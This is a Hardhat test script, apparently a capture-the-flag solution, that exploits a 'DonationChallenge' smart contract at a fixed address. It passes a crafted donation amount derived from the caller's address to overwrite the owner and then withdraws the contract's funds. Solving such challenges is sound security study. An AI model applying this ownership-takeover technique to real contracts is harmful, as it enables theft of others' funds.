import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

const sleep = (timeToSleepInSecs: number) => new Promise((resolve) => {
  setTimeout(resolve, timeToSleepInSecs * 1000);
})

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {
    const hre = require("hardhat");
    const accounts = await hre.ethers.getSigners();
    // Attach to contracts
    const toa="0x68bB33dd99a938966E05C74AC733d1f34030D1be";
    const challengeContract = await (await ethers.getContractFactory("DonationChallenge")).attach(toa);
  
    console.log("Explotando!!!");
    //you need to call donate() with your address as input and your address / 10³⁶ as amount in wei. 
    const monto=parseInt(parseInt(accounts[0].address)/(10**36));
    console.log(monto);
    await challengeContract.donate(accounts[0].address,{value:monto});
    sleep(15);
    //Then call withdraw()
    await challengeContract.withdraw(); //Retira fondos
    sleep(15);
    expect(await challengeContract.isComplete()).to.be.true;
  });
});